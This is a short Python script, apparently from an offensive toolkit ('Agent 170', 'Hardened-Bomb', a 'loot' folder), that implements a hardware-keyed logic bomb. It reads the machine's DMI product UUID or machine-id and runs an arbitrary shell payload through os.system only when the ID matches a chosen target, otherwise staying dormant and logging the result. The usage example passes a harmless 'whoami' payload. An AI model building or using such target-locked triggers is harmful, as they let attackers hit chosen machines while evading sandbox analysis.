#!/usr/bin/env python3
import subprocess
import os
import sys

def execute_with_lock(target_uuid, payload_command):
    print("[*] [Agent 170] Hardened-Bomb: Verifying hardware identity...")
    
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    loot_path = os.path.join(base_dir, "loot", "trigger_log.txt")
    
    # Get the machine's unique Product UUID (requires root, but high-fidelity)
    try:
        current_uuid = subprocess.check_output(
            "cat /sys/class/dmi/id/product_uuid 2>/dev/null || cat /etc/machine-id", 
            shell=True
        ).decode().strip()
        
        if current_uuid == target_uuid:
            print("[!] IDENTITY VERIFIED. Triggering payload...")
            with open(loot_path, "a") as f:
                f.write(f"SUCCESS: Target {current_uuid} matched. Executing: {payload_command}\n")
            
            # Execute the payload
            os.system(payload_command)
        else:
            print("[-] Identity Mismatch. Remaining dormant.")
            with open(loot_path, "a") as f:
                f.write(f"DORMANT: Current ID {current_uuid} does not match target {target_uuid}.\n")

    except Exception as e:
        print(f"[!] Error during identity check: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 main.py <target_uuid_or_id> <payload_command>")
        print("Example: python3 main.py 550e8400-e29b-41d4-a716-446655440000 'whoami > /tmp/proof.txt'")
        sys.exit(1)
    
    execute_with_lock(sys.argv[1], sys.argv[2])
